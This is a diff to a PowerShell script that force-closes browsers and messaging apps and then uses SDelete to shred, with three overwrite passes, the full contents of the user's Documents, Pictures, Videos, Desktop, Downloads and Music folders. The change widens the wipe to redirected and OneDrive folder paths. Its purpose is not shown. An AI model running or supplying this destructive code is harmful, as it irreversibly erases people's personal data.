@@ -83,10 +83,26 @@ $procs = "chrome","msedge","brave","firefox","opera","Discord","WhatsApp","Teleg
 Stop-Process -Name $procs -Force
 Start-Sleep -Seconds 2
 
-$folders = "Downloads","Documents","Pictures","Videos","Desktop"
+# Get real folder paths (handling OneDrive/Redirection)
+$folders = @(
+    [Environment]::GetFolderPath('MyDocuments'),
+    [Environment]::GetFolderPath('MyPictures'),
+    [Environment]::GetFolderPath('MyVideos'),
+    [Environment]::GetFolderPath('Desktop'),
+    [Environment]::GetFolderPath('UserProfile') + "\Downloads" # Downloads often not in enum for older .NET
+)
+
+# Add Music if available
+$music = [Environment]::GetFolderPath('MyMusic')
+if ($music) { $folders += $music }
+
 foreach ($f in $folders) {
-    if (Test-Path "$env:USERPROFILE\$f") {
-        & $SDEL -p 3 -s -q "$env:USERPROFILE\$f\*"
+    if ($f -and (Test-Path $f)) {
+        Write-Host "[~] Shredding contents of: $f" -FG $Y
+        # Use Get-ChildItem to safely pass paths to SDelete
+        # SDelete wildcard expansion can be tricky from PS, so we feed files directly or use simple wildcard
+        $target = Join-Path $f "*"
+        & $SDEL -p 3 -s -q $target
     }
 }
 
